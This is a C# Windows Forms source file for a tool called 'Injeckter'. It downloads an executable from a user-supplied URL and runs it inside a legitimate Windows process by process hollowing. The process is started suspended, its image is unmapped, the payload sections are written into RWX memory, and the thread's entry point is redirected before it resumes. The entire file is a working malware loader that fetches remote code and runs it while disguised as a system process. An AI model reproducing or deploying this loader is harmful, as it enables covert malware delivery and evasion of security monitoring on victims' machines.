using System;
using System.IO;
using System.Net;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace Injeckter
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            comboBoxProcess.SelectedIndex = 0;
        }

        #region dllimport
        [DllImport("kernel32.dll")]
        private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, byte[] lpStartupInfo, byte[] lpProcessInformation);

        [DllImport("kernel32.dll")]
        private static extern long VirtualAllocEx(long hProcess, long lpAddress, long dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        private static extern long WriteProcessMemory(long hProcess, long lpBaseAddress, byte[] lpBuffer, int nSize, long written);

        [DllImport("ntdll.dll")]
        private static extern uint ZwUnmapViewOfSection(long ProcessHandle, long BaseAddress);

        [DllImport("kernel32.dll")]
        private static extern bool SetThreadContext(long hThread, IntPtr lpContext);

        [DllImport("kernel32.dll")]
        private static extern bool GetThreadContext(long hThread, IntPtr lpContext);

        [DllImport("kernel32.dll")]
        private static extern uint ResumeThread(long hThread);

        [DllImport("kernel32.dll")]
        private static extern bool CloseHandle(long handle);
        #endregion

        // https://github.com/0xyg3n/PEx64-Injector/blob/main/PEx64-Injector/Program.cs
        // pbf = payload buffer
        // hst = hst
        // pehofs = offset to start of PE header 
        // soi = size of image
        // soh = size of headers
        // ep = entry point
        // nos = number of sects
        // sooh = size of optional header
        // ib = image base
        // bsi = byte array of startup info
        // bpi = byte array of process info
        // ptc = pointer to thread context
        // thst = target hst
        // curdir = current directory
        // ph = process handle
        // th = thread handle
        // va = virtual address
        // sord = size of raw data
        // prd = pointer to raw data
        // brd = byte array of raw data
        // bib = byte array of image base
        // rdx = register dx
        // rdxofs = rdx offset
        // rcxofs = register cx offset

        static void LoadIt(byte[] pbf, string hst)
        {
            int pehofs = Marshal.ReadInt32(pbf, 0x3c);
            int soi = Marshal.ReadInt32(pbf, pehofs + 0x18 + 0x038);
            int soh = Marshal.ReadInt32(pbf, pehofs + 0x18 + 0x03c);
            int ep = Marshal.ReadInt32(pbf, pehofs + 0x18 + 0x10);

            short nos = Marshal.ReadInt16(pbf, pehofs + 0x4 + 0x2);
            short sooh = Marshal.ReadInt16(pbf, pehofs + 0x4 + 0x10);

            long ib = Marshal.ReadInt64(pbf, pehofs + 0x18 + 0x18);

            byte[] bsi = new byte[0x68];
            byte[] bpi = new byte[0x18];

            IntPtr ptc = Allocate(0x4d0, 16);

            string thst = hst;
            string curdir = Directory.GetCurrentDirectory();

            Marshal.WriteInt32(ptc, 0x30, 0x0010001b);

            CreateProcess(null, thst, IntPtr.Zero, IntPtr.Zero, true, 0x4u, IntPtr.Zero, curdir, bsi, bpi);
            long ph = Marshal.ReadInt64(bpi, 0x0);
            long th = Marshal.ReadInt64(bpi, 0x8);

            ZwUnmapViewOfSection(ph, ib);
            VirtualAllocEx(ph, ib, soi, 0x3000, 0x40);
            WriteProcessMemory(ph, ib, pbf, soh, 0L);

            for (short i = 0; i < nos; i++)
            {
                byte[] sect = new byte[0x28];
                Buffer.BlockCopy(pbf, pehofs + (0x18 + sooh) + (0x28 * i), sect, 0, 0x28);

                int va = Marshal.ReadInt32(sect, 0x00c);
                int sord = Marshal.ReadInt32(sect, 0x010);
                int prd = Marshal.ReadInt32(sect, 0x014);

                byte[] brd = new byte[sord];
                Buffer.BlockCopy(pbf, prd, brd, 0, brd.Length);

                WriteProcessMemory(ph, ib + va, brd, brd.Length, 0L);
            }

            GetThreadContext(th, ptc);

            byte[] bib = BitConverter.GetBytes(ib);

            int rdxofs = 0x88;
            long rdx = Marshal.ReadInt64(ptc, rdxofs);
            WriteProcessMemory(ph, rdx + 16, bib, 8, 0L);

            int rcxofs = 0x80;
            Marshal.WriteInt64(ptc, rcxofs, ib + ep);

            SetThreadContext(th, ptc);
            ResumeThread(th);

            Marshal.FreeHGlobal(ptc);
            CloseHandle(ph);
            CloseHandle(th);
        }

        private static IntPtr Align(IntPtr source, int alignment)
        {
            long source64 = source.ToInt64() + (alignment - 1);
            long aligned = alignment * (source64 / alignment);
            return new IntPtr(aligned);
        }

        private static IntPtr Allocate(int size, int alignment)
        {
            IntPtr allocated = Marshal.AllocHGlobal(size + (alignment / 2));
            return Align(allocated, alignment);
        }

        private bool IsUri(string url)
        {
            Uri uriResult;
            bool result = Uri.TryCreate(url, UriKind.Absolute, out uriResult) && (uriResult.Scheme == Uri.UriSchemeHttp || uriResult.Scheme == Uri.UriSchemeHttps);
            return result;
        }

        private void checkBoxCustomProcess_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBoxCustomProcess.Checked)
            {
                textBoxProcess.Visible = true;
                comboBoxProcess.Visible = false;
                textBoxProcess.Text = "FULL PATH TO EXE";
            }
            else
            {
                textBoxProcess.Visible = false;
                comboBoxProcess.Visible = true;
                textBoxProcess.Text = "FULL PATH TO EXE";
            }
        }

        private void textBoxProcess_Enter(object sender, EventArgs e)
        {
            if (checkBoxCustomProcess.Checked && textBoxProcess.Text == "FULL PATH TO EXE")
            {
                textBoxProcess.Clear();
            }
        }

        private void textBoxProcess_Leave(object sender, EventArgs e)
        {
            if (checkBoxCustomProcess.Checked && textBoxProcess.Text == "")
            {
                textBoxProcess.Text = "FULL PATH TO EXE";
            }
        }

        private void buttonRun_Click(object sender, EventArgs e)
        {
            WebClient client = new WebClient();
            byte[] cmd;
            string processfile = "";

            if (checkBoxCustomProcess.Checked)
            {
                processfile = textBoxProcess.Text;
            }
            else
            {
                processfile = "C:\\Windows\\System32\\" + comboBoxProcess.Text;
            }

            //if (File.Exists(processfile) && IsUri(textBoxURL.Text))
            if (File.Exists(processfile) && Uri.IsWellFormedUriString(textBoxURL.Text, UriKind.Absolute))
            {
                cmd = client.DownloadData(textBoxURL.Text);
                LoadIt(cmd, processfile);

                if (checkBoxShutdown.Checked)
                {
                    Application.Exit();
                }
            }
            else
            {
                MessageBox.Show("Please check URL and Process file.");
            }
        }

        private void buttonHelp_Click(object sender, EventArgs e)
        {
            using(var form2 = new Form2())
            {
                form2.ShowDialog();
            }
        }
    }
}
